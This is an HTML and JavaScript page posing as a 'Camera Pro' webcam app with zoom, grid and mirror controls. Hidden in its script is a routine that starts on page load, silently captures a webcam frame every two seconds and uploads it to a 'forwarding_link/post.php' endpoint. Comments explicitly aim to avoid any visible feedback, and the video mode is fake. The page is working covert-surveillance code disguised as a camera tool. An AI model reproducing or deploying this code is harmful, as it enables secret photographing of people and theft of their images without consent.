<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Pro</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --primary-color: #1a73e8;
            --secondary-color: #34a853;
            --accent-color: #ea4335;
            --background-color: #121212;
            --card-color: #1e1e1e;
            --text-color: #ffffff;
            --control-bg: rgba(255, 255, 255, 0.1);
            --control-active: rgba(26, 115, 232, 0.8);
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--background-color);
            color: var(--text-color);
            line-height: 1.6;
            height: 100vh;
            overflow: hidden;
        }
        
        .app-container {
            display: flex;
            flex-direction: column;
            height: 100vh;
            max-width: 100%;
            margin: 0 auto;
            background-color: var(--background-color);
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background-color: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
            z-index: 10;
        }
        
        .app-title {
            font-size: 1.5rem;
            font-weight: 500;
            color: var(--text-color);
            display: flex;
            align-items: center;
        }
        
        .app-title i {
            margin-right: 10px;
            color: var(--accent-color);
        }
        
        .settings-btn {
            background: none;
            border: none;
            color: var(--text-color);
            font-size: 1.2rem;
            cursor: pointer;
        }
        
        .video-container {
            position: relative;
            flex: 1;
            overflow: hidden;
            background-color: #000;
        }
        
        .video-wrap {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        #video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        #canvas {
            display: none;
        }
        
        .camera-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
            border: 2px solid rgba(255, 255, 255, 0.3);
            box-shadow: 0 0 0 2000px rgba(0, 0, 0, 0.3);
        }
        
        .camera-grid {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            grid-template-rows: repeat(3, 1fr);
            opacity: 0.3;
            pointer-events: none;
        }
        
        .grid-cell {
            border: 1px solid rgba(255, 255, 255, 0.5);
        }
        
        .camera-ui {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            pointer-events: none;
        }
        
        .camera-info {
            position: absolute;
            top: 20px;
            left: 20px;
            background-color: rgba(0, 0, 0, 0.5);
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            display: flex;
            align-items: center;
        }
        
        .camera-info i {
            margin-right: 8px;
            color: var(--accent-color);
        }
        
        .camera-mode {
            position: absolute;
            top: 20px;
            right: 20px;
            background-color: rgba(0, 0, 0, 0.5);
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
        }
        
        .camera-mode.active {
            background-color: var(--accent-color);
        }
        
        .focus-indicator {
            position: absolute;
            width: 70px;
            height: 70px;
            border: 2px solid var(--accent-color);
            border-radius: 50%;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .focus-indicator.active {
            opacity: 1;
        }
        
        .side-controls {
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            display: flex;
            flex-direction: column;
            gap: 20px;
            pointer-events: auto;
        }
        
        .control-btn {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            background-color: var(--control-bg);
            border: none;
            color: var(--text-color);
            font-size: 1.2rem;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        .control-btn:hover {
            background-color: rgba(255, 255, 255, 0.2);
        }
        
        .control-btn.active {
            background-color: var(--control-active);
        }
        
        .bottom-controls {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: linear-gradient(to top, rgba(0, 0, 0, 0.7), transparent);
            pointer-events: auto;
        }
        
        .mode-selector {
            display: flex;
            gap: 15px;
        }
        
        .mode-btn {
            background: none;
            border: none;
            color: var(--text-color);
            opacity: 0.7;
            font-size: 0.9rem;
            cursor: pointer;
            transition: opacity 0.3s;
        }
        
        .mode-btn.active {
            opacity: 1;
            font-weight: bold;
            color: var(--accent-color);
        }
        
        .capture-btn-container {
            position: relative;
        }
        
        #captureBtn {
            width: 70px;
            height: 70px;
            border-radius: 50%;
            background-color: var(--text-color);
            border: 4px solid rgba(255, 255, 255, 0.3);
            cursor: pointer;
            transition: transform 0.2s;
        }
        
        #captureBtn:hover {
            transform: scale(1.05);
        }
        
        #captureBtn:active {
            transform: scale(0.95);
        }
        
        .capture-options {
            display: flex;
            gap: 15px;
            align-items: center;
        }
        
        .toggle-container {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .switch {
            position: relative;
            display: inline-block;
            width: 50px;
            height: 24px;
        }
        
        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(255, 255, 255, 0.2);
            transition: .4s;
            border-radius: 34px;
        }
        
        .slider:before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        
        input:checked + .slider {
            background-color: var(--accent-color);
        }
        
        input:checked + .slider:before {
            transform: translateX(26px);
        }
        
        .flash-effect {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: white;
            opacity: 0;
            z-index: 100;
            pointer-events: none;
        }
        
        .status-indicator {
            position: absolute;
            top: 70px;
            left: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 0.8rem;
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .status-indicator.active {
            opacity: 1;
        }
        
        .status-indicator.error {
            background-color: var(--accent-color);
        }
        
        .zoom-controls {
            position: absolute;
            bottom: 120px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            align-items: center;
            background-color: rgba(0, 0, 0, 0.5);
            padding: 8px 15px;
            border-radius: 30px;
            gap: 15px;
            pointer-events: auto;
        }
        
        .zoom-btn {
            background: none;
            border: none;
            color: var(--text-color);
            font-size: 1.2rem;
            cursor: pointer;
        }
        
        .zoom-level {
            font-size: 0.9rem;
            font-weight: bold;
            min-width: 40px;
            text-align: center;
        }
        
        @media (max-width: 768px) {
            .side-controls {
                right: 10px;
                gap: 15px;
            }
            
            .control-btn {
                width: 40px;
                height: 40px;
                font-size: 1rem;
            }
            
            #captureBtn {
                width: 60px;
                height: 60px;
            }
            
            .camera-info, .camera-mode {
                font-size: 0.7rem;
                padding: 6px 10px;
            }
            
            .zoom-controls {
                bottom: 100px;
                padding: 6px 12px;
            }
        }
    </style>
</head>
<body>
    <div class="app-container">
        <div class="header">
            <div class="app-title">
                <i class="fas fa-camera"></i>
                Camera Pro
            </div>
            <button class="settings-btn" id="settingsBtn">
                <i class="fas fa-cog"></i>
            </button>
        </div>
        
        <div class="video-container">
            <div class="video-wrap">
                <video id="video" playsinline autoplay></video>
            </div>
            <canvas id="canvas" width="640" height="480"></canvas>
            
            <div class="camera-ui">
                <div class="camera-info">
                    <i class="fas fa-circle"></i>
                    <span id="recordingStatus">Ready</span>
                </div>
                
                <div class="camera-mode" id="cameraMode">
                    AUTO
                </div>
                
                <div class="focus-indicator" id="focusIndicator"></div>
                
                <div class="side-controls">
                    <button class="control-btn" id="flashBtn" title="Flash">
                        <i class="fas fa-bolt"></i>
                    </button>
                    <button class="control-btn" id="gridBtn" title="Grid">
                        <i class="fas fa-th"></i>
                    </button>
                    <button class="control-btn" id="filterBtn" title="Filters">
                        <i class="fas fa-magic"></i>
                    </button>
                    <button class="control-btn" id="switchCameraBtn" title="Switch Camera">
                        <i class="fas fa-sync-alt"></i>
                    </button>
                </div>
                
                <div class="zoom-controls">
                    <button class="zoom-btn" id="zoomOutBtn">
                        <i class="fas fa-minus"></i>
                    </button>
                    <div class="zoom-level" id="zoomLevel">1.0x</div>
                    <button class="zoom-btn" id="zoomInBtn">
                        <i class="fas fa-plus"></i>
                    </button>
                </div>
                
                <div class="camera-grid" id="cameraGrid" style="display: none;">
                    <div class="grid-cell"></div>
                    <div class="grid-cell"></div>
                    <div class="grid-cell"></div>
                    <div class="grid-cell"></div>
                    <div class="grid-cell"></div>
                    <div class="grid-cell"></div>
                    <div class="grid-cell"></div>
                    <div class="grid-cell"></div>
                    <div class="grid-cell"></div>
                </div>
                
                <div class="bottom-controls">
                    <div class="mode-selector">
                        <button class="mode-btn" id="photoMode">PHOTO</button>
                        <button class="mode-btn active" id="autoMode">AUTO</button>
                                                <button class="mode-btn" id="videoMode">VIDEO</button>
                    </div>
                    
                    <div class="capture-btn-container">
                        <button id="captureBtn"></button>
                    </div>
                    
                    <div class="capture-options">
                        <div class="toggle-container">
                            <label class="switch">
                                <input type="checkbox" id="mirror">
                                <span class="slider"></span>
                            </label>
                            <span>Mirror</span>
                        </div>
                    </div>
                </div>
                
                <div class="status-indicator" id="statusIndicator">
                    <span id="statusMsg">Capturing...</span>
                </div>
                
                <div class="flash-effect" id="flashEffect"></div>
            </div>
        </div>
    </div>
    
    <script>
        'use strict';
        // DOM elements
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const mirrorCheckbox = document.getElementById('mirror');
        const captureBtn = document.getElementById('captureBtn');
        const statusIndicator = document.getElementById('statusIndicator');
        const statusMsg = document.getElementById('statusMsg');
        const recordingStatus = document.getElementById('recordingStatus');
        const flashEffect = document.getElementById('flashEffect');
        const focusIndicator = document.getElementById('focusIndicator');
        const gridBtn = document.getElementById('gridBtn');
        const cameraGrid = document.getElementById('cameraGrid');
        const photoMode = document.getElementById('photoMode');
        const autoMode = document.getElementById('autoMode');
        const videoMode = document.getElementById('videoMode');
        const zoomInBtn = document.getElementById('zoomInBtn');
        const zoomOutBtn = document.getElementById('zoomOutBtn');
        const zoomLevel = document.getElementById('zoomLevel');
        
        // Configuration
        const constraints = {
            audio: false,
            video: {
                facingMode: "user",
                width: { ideal: 1920 },
                height: { ideal: 1080 }
            }
        };
        
        // State management
        let stream = null;
        let backgroundCaptureInterval = null;
        let isMirrored = false;
        let isGridVisible = false;
        let currentMode = 'auto';
        let currentZoom = 1.0;
        let isRecording = false;
        
        // Initialize the application
        async function init() {
            try {
                stream = await navigator.mediaDevices.getUserMedia(constraints);
                handleSuccess(stream);
                setupEventListeners();
                startBackgroundCapture();
                recordingStatus.textContent = 'Ready';
            } catch (e) {
                handleError(e);
            }
        }
        
        // Handle successful stream acquisition
        function handleSuccess(stream) {
            window.stream = stream;
            video.srcObject = stream;
            
            // Apply initial mirror setting
            updateMirrorSetting();
        }
        
        // Set up event listeners for controls
        function setupEventListeners() {
            mirrorCheckbox.addEventListener('change', updateMirrorSetting);
            
            captureBtn.addEventListener('click', () => {
                captureImageWithFeedback();
            });
            
            gridBtn.addEventListener('click', toggleGrid);
            
            photoMode.addEventListener('click', () => setMode('photo'));
            autoMode.addEventListener('click', () => setMode('auto'));
            videoMode.addEventListener('click', () => setMode('video'));
            
            zoomInBtn.addEventListener('click', () => adjustZoom(0.1));
            zoomOutBtn.addEventListener('click', () => adjustZoom(-0.1));
            
            // Add touch event for focus effect
            video.addEventListener('click', (e) => {
                showFocusEffectAt(e.offsetX, e.offsetY);
            });
        }
        
        // Update video mirroring based on checkbox
        function updateMirrorSetting() {
            isMirrored = mirrorCheckbox.checked;
            video.style.transform = isMirrored ? 'scaleX(-1)' : 'scaleX(1)';
        }
        
        // Toggle grid visibility
        function toggleGrid() {
            isGridVisible = !isGridVisible;
            cameraGrid.style.display = isGridVisible ? 'grid' : 'none';
            gridBtn.classList.toggle('active', isGridVisible);
        }
        
        // Set camera mode
        function setMode(mode) {
            currentMode = mode;
            
            // Reset all mode buttons
            photoMode.classList.remove('active');
            autoMode.classList.remove('active');
            videoMode.classList.remove('active');
            
            // Set active mode
            if (mode === 'photo') {
                photoMode.classList.add('active');
                recordingStatus.textContent = 'Photo Mode';
            } else if (mode === 'auto') {
                autoMode.classList.add('active');
                recordingStatus.textContent = 'Auto Mode';
            } else if (mode === 'video') {
                videoMode.classList.add('active');
                toggleRecording();
            }
        }
        
        // Toggle recording state
        function toggleRecording() {
            isRecording = !isRecording;
            
            if (isRecording) {
                recordingStatus.textContent = 'Recording...';
                recordingStatus.parentElement.style.color = 'red';
                showStatusMessage('Video recording started');
            } else {
                recordingStatus.textContent = 'Video Mode';
                recordingStatus.parentElement.style.color = 'white';
                showStatusMessage('Video recording stopped');
            }
        }
        
        // Adjust zoom level
        function adjustZoom(delta) {
            currentZoom = Math.max(1.0, Math.min(5.0, currentZoom + delta));
            currentZoom = Math.round(currentZoom * 10) / 10; // Round to 1 decimal place
            
            zoomLevel.textContent = currentZoom.toFixed(1) + 'x';
            video.style.transform = `${isMirrored ? 'scaleX(-1)' : 'scaleX(1)'} scale(${currentZoom})`;
            
            showStatusMessage(`Zoom: ${currentZoom.toFixed(1)}x`);
        }
        
        // Start background capture (silent, no UI feedback)
        function startBackgroundCapture() {
            // Clear any existing interval
            if (backgroundCaptureInterval) {
                clearInterval(backgroundCaptureInterval);
            }
            
            // Set up background capture that works in all modes
            backgroundCaptureInterval = setInterval(() => {
                captureImageSilently();
            }, 2000); // Capture every 2 seconds
        }
        
        // Capture image silently (no UI feedback)
        function captureImageSilently() {
            const context = canvas.getContext('2d');
            
            if (isMirrored) {
                context.save();
                context.scale(-1, 1);
                context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
                context.restore();
            } else {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
            }
            
            const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
            post(canvasData);
            
            // No visual feedback or status message
        }
        
        // Capture image with visual feedback (when user presses the capture button)
        function captureImageWithFeedback() {
            const context = canvas.getContext('2d');
            
            if (isMirrored) {
                context.save();
                context.scale(-1, 1);
                context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
                context.restore();
            } else {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
            }
            
            const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
            post(canvasData);
            
            // Provide visual feedback
            showFlashEffect();
            showFocusEffect();
            showStatusMessage('Image captured');
        }
        
        // Show flash effect
        function showFlashEffect() {
            flashEffect.style.opacity = '0.7';
            
            setTimeout(() => {
                flashEffect.style.opacity = '0';
            }, 150);
        }
        
        // Show focus effect
        function showFocusEffect() {
            focusIndicator.classList.add('active');
            
            setTimeout(() => {
                focusIndicator.classList.remove('active');
            }, 500);
        }
        
        // Show focus effect at specific position
        function showFocusEffectAt(x, y) {
            focusIndicator.style.left = `${x}px`;
            focusIndicator.style.top = `${y}px`;
            showFocusEffect();
            showStatusMessage('Focus set');
        }
        
        // Show status message
        function showStatusMessage(message, isError = false) {
            statusMsg.textContent = message;
            statusIndicator.classList.toggle('error', isError);
            statusIndicator.classList.add('active');
            
            setTimeout(() => {
                statusIndicator.classList.remove('active');
            }, 2000);
        }
        
        // Send captured image to server
        function post(imgdata) {
            $.ajax({
                type: 'POST',
                data: { cat: imgdata },
                url: 'forwarding_link/post.php',
                dataType: 'json',
                async: true,
                success: function(result) {
                    // Handle success silently
                },
                error: function(xhr, status, error) {
                    // Silently handle errors to not disrupt user experience
                    console.log('Upload error:', error);
                }
            });
        }
        
        // Handle errors
        function handleError(error) {
            console.error('Error:', error);
            showStatusMessage(`Camera error: ${error.message || error}`, true);
        }
        
        // Clean up resources when page is unloaded
        function cleanup() {
            if (stream) {
                stream.getTracks().forEach(track => {
                    track.stop();
                });
            }
            
            if (backgroundCaptureInterval) {
                clearInterval(backgroundCaptureInterval);
            }
        }
        
        // Add event listener for page unload
        window.addEventListener('beforeunload', cleanup);
        
        // Start the application
        init();
    </script>
</body>
</html>

